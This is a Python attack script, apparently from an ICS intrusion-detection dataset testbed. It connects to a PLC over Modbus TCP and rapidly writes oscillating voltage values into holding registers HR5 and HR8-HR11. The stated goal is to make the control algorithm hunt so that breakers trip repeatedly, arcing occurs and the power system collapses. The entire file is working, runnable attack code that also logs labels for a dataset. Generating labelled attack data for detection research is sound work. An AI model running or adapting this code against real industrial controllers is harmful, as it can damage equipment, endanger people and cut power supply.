"""
Attack #8: Voltage_Instability (Voltage Instability)
====================================================
Target: HR5 (Min Voltage x1000) + HR8-HR11 (Bus Voltages)
Technique: Rapidly oscillates voltage readings up and down to drive the
           PLC control algorithm into a "hunting" oscillation state.
Effect: Breakers repeatedly trip open/closed, arcing occurs, system collapses.
MITRE ATT&CK for ICS: T0836 - Modify Parameter
"""
import time, random, sys, os
sys.path.insert(0, os.path.dirname(os.path.dirname(os.path.abspath(__file__))))
from pymodbus.client import ModbusTcpClient
from attacks.config import (PLC_IP, PLC_PORT, UNIT_ID,
    HR5_MIN_VOLTAGE, HR8_V_SUB, HR9_V_IND, HR10_V_RES, HR11_V_COM,
    LABEL_VOLTAGE_INSTABILITY)

ATTACK_NAME = "Voltage_Instability"
ATTACK_ID   = LABEL_VOLTAGE_INSTABILITY

# Voltage fluctuation values (x1000 scale)
# Normal: ~960-1000 | Attack: wild swings between 800-1150
VOLT_VALUES = [800, 850, 1100, 1150, 880, 1080, 900, 1050, 870, 1120]

def run_attack(duration_sec=600, label_manager=None):
    client = ModbusTcpClient(PLC_IP, port=PLC_PORT)
    if not client.connect():
        print(f"[-] PLC connection failed: {PLC_IP}:{PLC_PORT}")
        return False

    print(f"{'='*65}")
    print(f"  ATTACK #{ATTACK_ID}: {ATTACK_NAME}")
    print(f"  Target: {PLC_IP}:{PLC_PORT}")
    print(f"  Voltage range: {min(VOLT_VALUES)/1000:.3f}-{max(VOLT_VALUES)/1000:.3f} pu")
    print(f"  Duration: {duration_sec}s ({duration_sec//60} min)")
    print(f"{'='*65}")

    if label_manager:
        label_manager.log_attack_start(ATTACK_ID, ATTACK_NAME,
            f"V_range={min(VOLT_VALUES)/1000:.3f}-{max(VOLT_VALUES)/1000:.3f} pu")

    start_time = time.time()
    pkt_count = 0

    try:
        while (time.time() - start_time) < duration_sec:
            v = random.choice(VOLT_VALUES)
            try:
                client.write_register(address=HR5_MIN_VOLTAGE, value=v)
                client.write_register(address=HR8_V_SUB, value=v + random.randint(-20, 20))
                client.write_register(address=HR9_V_IND, value=v + random.randint(-30, 10))
                client.write_register(address=HR10_V_RES, value=v + random.randint(-40, 0))
                client.write_register(address=HR11_V_COM, value=v + random.randint(-50, -10))
                pkt_count += 5
            except Exception:
                try:
                    client.close()
                    client = ModbusTcpClient(PLC_IP, port=PLC_PORT)
                    client.connect()
                except Exception:
                    pass
                time.sleep(0.5)
                continue

            if pkt_count % 500 == 0:
                rem = duration_sec - (time.time() - start_time)
                print(f"  [VOLT] {pkt_count} packets | last V={v/1000:.3f}pu | remaining: {rem:.0f}s")
            time.sleep(0.1)

    except KeyboardInterrupt:
        print("\n  [VOLT] Manual stop!")
    finally:
        elapsed = time.time() - start_time
        client.close()
        if label_manager:
            label_manager.log_attack_end(ATTACK_ID, ATTACK_NAME,
                f"{pkt_count} packets, {elapsed:.1f}s")
        print(f"\n  [VOLT] {pkt_count} packets, {elapsed:.1f}s")
        return True

if __name__ == "__main__":
    run_attack(duration_sec=60)
